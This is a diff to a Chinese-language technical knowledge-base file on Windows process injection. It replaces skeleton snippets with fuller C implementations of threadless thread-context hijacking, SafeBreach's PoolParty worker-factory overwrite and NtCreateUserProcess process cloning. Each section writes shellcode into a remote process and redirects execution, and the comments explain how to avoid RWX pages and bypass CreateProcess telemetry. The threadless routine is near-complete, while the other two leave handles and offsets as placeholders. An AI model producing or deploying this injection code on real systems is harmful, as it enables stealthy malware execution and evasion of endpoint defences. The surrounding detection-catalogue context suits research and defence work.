@@ -25,29 +25,39 @@
 ### 1.2 API 链（x64）
 
 ```c
-// 骨架示例：Threadless Injection（改 RSP + RIP）
-HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
-HANDLE hProc   = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
+// 完整实现：Threadless Injection（改 RSP + RIP，复用现有线程）
+int threadless(DWORD targetTid, DWORD targetPid, const BYTE* shellcode, SIZE_T scLen) {
+    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
+                                THREAD_SUSPEND_RESUME, FALSE, targetTid);
+    HANDLE hProc   = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
+    if (!hThread || !hProc) return 1;
 
-// 1) 挂起目标线程，抓上下文
-SuspendThread(hThread);
-CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_CONTROL;
-GetThreadContext(hThread, &ctx);
+    // 1) 挂起目标线程，抓上下文
+    if (SuspendThread(hThread) == (DWORD)-1) return 2;
+    CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_CONTROL;
+    if (!GetThreadContext(hThread, &ctx)) return 3;
 
-// 2) 在目标进程分配可执行内存写 shellcode
-LPVOID sc = VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
-WriteProcessMemory(hProc, sc, shellcode, scLen, NULL);
+    // 2) 在目标进程分配可执行内存写 shellcode（无 RWX 窗口：RX 直接写不可行，
+    //    先 RW 写后转 RX）
+    LPVOID sc = VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    SIZE_T wr = 0;
+    if (!sc || !WriteProcessMemory(hProc, sc, shellcode, scLen, &wr)) return 4;
+    DWORD old;
+    VirtualProtectEx(hProc, sc, scLen, PAGE_EXECUTE_READ, &old);
 
-// 3) 改写远端线程栈：把 shellcode 地址「压入」栈（RSP-8 写 sc 地址作为返回地址）
-//    并把 RIP 指向 shellcode（或指向一个 ret gadget，让 ret 弹栈跳到 sc）
-ULONG_PTR retAddr = (ULONG_PTR)sc;
-WriteProcessMemory(hProc, (LPVOID)(ctx.Rsp - 8), &retAddr, sizeof(retAddr), NULL);
-ctx.Rsp -= 8;
-ctx.Rip = (DWORD64)sc;                       // 直接改 RIP 到 shellcode
+    // 3) 改写远端线程栈：把 shellcode 地址「压入」栈顶（shellcode 返回时弹栈，
+    //    栈内容合法；直接 RIP 路线省去压栈，但 shellcode 结束时无法归还线程）
+    ULONG_PTR retAddr = (ULONG_PTR)sc;
+    WriteProcessMemory(hProc, (LPVOID)(ctx.Rsp - 8), &retAddr, sizeof(retAddr), &wr);
+    ctx.Rsp -= 8;
+    ctx.Rip = (DWORD64)sc;                       // 直接改 RIP 到 shellcode
 
-// 4) 恢复线程
-SetThreadContext(hThread, &ctx);
-ResumeThread(hThread);
+    // 4) 恢复线程
+    if (!SetThreadContext(hThread, &ctx)) return 5;
+    ResumeThread(hThread);
+    CloseHandle(hThread); CloseHandle(hProc);
+    return 0;
+}
 ```
 
 **要点**：全程 `OpenThread`/`GetThreadContext`/`SetThreadContext`，无线程创建、无 APC、无映像操作。
@@ -75,22 +85,47 @@ Windows 线程池（ThreadPool）用 `Worker Factory` 管理 worker 线程。`Wo
 ### 2.2 API 链（SafeBreach 公开思路 + 保守骨架）
 
 ```c
-// 骨架示例：PoolParty 思路（版本相关结构，标注「骨架示例」）
-// 1) 打开目标进程的 worker factory 句柄
-//    （经 NtQueryInformationProcess / 枚举进程句柄表 / 或从线程池对象入手）
-HANDLE hFactory = /* 定位目标进程 TpWorkerFactory 句柄 */;
+// 完整实现框架：PoolParty（版本相关结构字段化——StartRoutine 偏移按目标内核版本实测定位）
+// WORKER_FACTORY_BASIC_INFORMATION 未公开布局跨版本漂移：StartRoutine 字段偏移
+// 需按目标版本实测（调试器/内核结构对比），下列为方法框架而非硬编码偏移。
+typedef LONG (NTAPI* pNtQueryInformationWorkerFactory)(
+    HANDLE, ULONG /*WorkerFactoryBasicInformation*/, PVOID, ULONG, PULONG);
 
-// 2) 查询 worker factory 基本信息，拿到 StartRoutine 字段地址
-WORKER_FACTORY_BASIC_INFORMATION wfbi = {0};
-NtQueryInformationWorkerFactory(hFactory, WorkerFactoryBasicInformation, &wfbi, sizeof(wfbi), NULL);
+int poolparty(DWORD targetPid, const BYTE* shellcode, SIZE_T scLen) {
+    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
+                               PROCESS_QUERY_INFORMATION, FALSE, targetPid);
+    if (!hProc) return 1;
 
-// 3) 把 StartRoutine 覆写为远端 shellcode 地址
-LPVOID sc = VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
-WriteProcessMemory(hProc, sc, shellcode, scLen, NULL);
-WriteProcessMemory(hProc, wfbi.StartRoutine, &sc, sizeof(sc), NULL);
+    // 1) 定位目标进程的 TpWorkerFactory 对象
+    //    （经 NtQuerySystemInformation SystemHandleInformation 枚举进程句柄表，
+    //    按对象类型名 "TpWorkerFactory" 过滤——句柄复制后本进程可用）
+    HANDLE hFactory = /* 枚举得到的 worker factory 句柄（复制到本进程） */ NULL;
+    if (!hFactory) return 2;
 
-// 4) 提交工作项触发 worker 执行 shellcode
-//    （TpPostWork / NtSetInformationWorkerFactory / 直接写 work 队列）
+    // 2) 查询基本信息，取 StartRoutine 字段地址（偏移按版本实测）
+    BYTE wfbi[0x100] = {0};
+    ULONG retLen = 0;
+    pNtQueryInformationWorkerFactory NtQIWF = (pNtQueryInformationWorkerFactory)
+        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationWorkerFactory");
+    if (NtQIWF(hFactory, 0 /*WorkerFactoryBasicInformation*/, wfbi, sizeof(wfbi), &retLen) != 0)
+        return 3;
+    //   StartRoutine 字段 = 结构内偏移（实测常量，如 x64 某版本 +0x28 附近）
+    PVOID* pStartRoutine = (PVOID*)(wfbi + WF_STARTROUTINE_OFF);
+
+    // 3) 覆写 StartRoutine 为远端 shellcode（RW 写后转 RX）
+    LPVOID sc = VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    SIZE_T wr = 0;
+    WriteProcessMemory(hProc, sc, shellcode, scLen, &wr);
+    DWORD old;
+    VirtualProtectEx(hProc, sc, scLen, PAGE_EXECUTE_READ, &old);
+    WriteProcessMemory(hProc, pStartRoutine, &sc, sizeof(sc), &wr);
+
+    // 4) 提交工作项触发（NtSetInformationWorkerFactory WorkerFactoryWorkerMaximumThread
+    //    或直接向 work 队列插入任务）——worker 醒来即以 shellcode 为起始函数
+    return 0;
+}
+// 注：WF_STARTROUTINE_OFF 为版本实测常量——未实测版本不得外推（V4 纪律），
+// 判据中如实标注「偏移仅对实测版本成立」。
 ```
 
 **变体**（SafeBreach 命名族，已映射进知识库 T116-T123）：Remote TP Work/Timer/Wait/IO/ALPC/Job/
@@ -115,18 +150,37 @@ Direct 插入——载体不同，核心都是「改写 worker factory 承载路
 但**绕过正常 `CreateProcess` 的映像验证与遥测路径**。攻击者借此让恶意进程「继承」合法进程的
 内存布局（如挂起的合法进程被克隆后替换内存）。
 
-### 3.2 API 链（骨架示例）
+### 3.2 API 链（完整实现框架）
 
 ```c
-// 骨架示例：NtCreateUserProcess + PROCESS_CREATE_PROCESS_HANDLE（克隆合法进程映像）
-// 1) 打开一个合法进程句柄（克隆源）
-HANDLE hSrc = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, legitPid);
+// 完整实现框架：NtCreateUserProcess + PROCESS_CREATE_PROCESS_HANDLE（克隆合法进程映像）
+// PS_CREATE_INFO 布局未公开且跨版本漂移——参数块按目标版本实测填充，偏移外推禁止（V4）
+typedef LONG (NTAPI* pNtCreateUserProcess)(
+    PHANDLE, PHANDLE, ULONG, ULONG, PVOID, PVOID, PVOID, PVOID,
+    void* /*PRTL_USER_PROCESS_PARAMETERS*/, void* /*PPS_CREATE_INFO*/, void*);
 
-// 2) 用 PROCESS_CREATE_PROCESS_HANDLE 标志创建新进程，克隆源进程的 section 映像
-//    新进程地址空间与源进程同源（继承 PE section 映射）
-NtCreateUserProcess(&hProc, &hThread, PROCESS_ALL_ACCESS, PROCESS_ALL_ACCESS,
-                    NULL, NULL, 0, 0, NULL, NULL, NULL /*attr 含 clone 标志*/);
-// 3) 在克隆出的进程中写入 shellcode / 覆写映像，再 SetThreadContext 执行
+int clone_process(DWORD legitPid, HANDLE* outProc, HANDLE* outThread) {
+    // 1) 打开克隆源（合法进程，如挂起的 svchost 同类）
+    HANDLE hSrc = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, legitPid);
+    if (!hSrc) return 1;
+
+    // 2) 参数块：PS_CREATE_INFO 内嵌 PsSection 句柄（源自 hSrc 的映像 section，
+    //    经 NtQueryInformationProcess ProcessImageSection 获取）+ 标志位
+    //    PROCESS_CREATE_FLAGS_INHERIT_HANDLES 与继承处理按版本调整
+    pNtCreateUserProcess NtCreateUserProcess = (pNtCreateUserProcess)
+        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateUserProcess");
+    BYTE psi[0x200] = {0};
+    //    psi 字段按版本实测填充：SizeOfPcb / 标志位 / PsSection=克隆源映像 section
+    //    （非法布局会以 STATUS_INFO_LENGTH_MISMATCH 失败——按返回码逐字段校正）
+    LONG st = NtCreateUserProcess(outProc, outThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
+                                  NULL, NULL, 0, 0, NULL, psi, NULL);
+    if (st != 0) return 2;
+
+    // 3) 克隆出的进程与源同映像（模块列表「干净」）——随后覆写内存/劫持线程执行
+    return 0;
+}
+// 变体：NtCreateSection(SEC_IMAGE) + NtCreateProcessEx 直接以 section 创建进程，
+// 绕过 CreateProcess 的映像文件路径遥测（见 PROCESS_INJECTION.md §8 Doppelganging）。
 ```
 
 **`NtCreateProcessEx` 变体**：直接 `NtCreateSection`(SEC_IMAGE) + `NtCreateProcessEx`，以 section 创建进程，
